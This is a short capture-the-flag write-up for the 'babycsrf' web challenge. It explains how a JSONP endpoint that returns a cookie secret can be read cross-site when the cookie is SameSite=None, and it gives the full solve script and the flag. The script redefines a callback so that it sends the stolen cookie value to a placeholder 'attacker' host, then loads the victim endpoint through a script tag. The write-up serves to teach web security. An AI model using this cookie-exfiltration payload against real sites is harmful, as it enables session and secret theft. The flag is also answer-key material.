# babycsrf (Web)

This challenge was intended to help new players learn how to expose HTML solutions and use an admin bot.

The website implements a JSONP api to get the flag from cookies:
```python
@app.route("/api")
def page():
    secret = request.cookies.get("secret", "EXAMPLEFLAG")
    return f"setMessage('irisctf{{{secret}}}');"
```

The intended attack is to include the api endpoint as a `<script>` tag. The hint says the cookie is set with SameSite=None, so the admin bot will send the cookies with such a request, even if it's not while on the challenge origin!
One can copy the provided homepage to see how to load it:

```js
window.setMessage = (m) => {
    document.location = `https://attacker/?${m}`;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "https://babycsrf-web.chal.irisc.tf/api";
    document.body.appendChild(s);
}
```

Adding this JS to the solve template and sending it to the bot will return the flag.

```
irisctf{jsonp_is_never_the_answer}
```
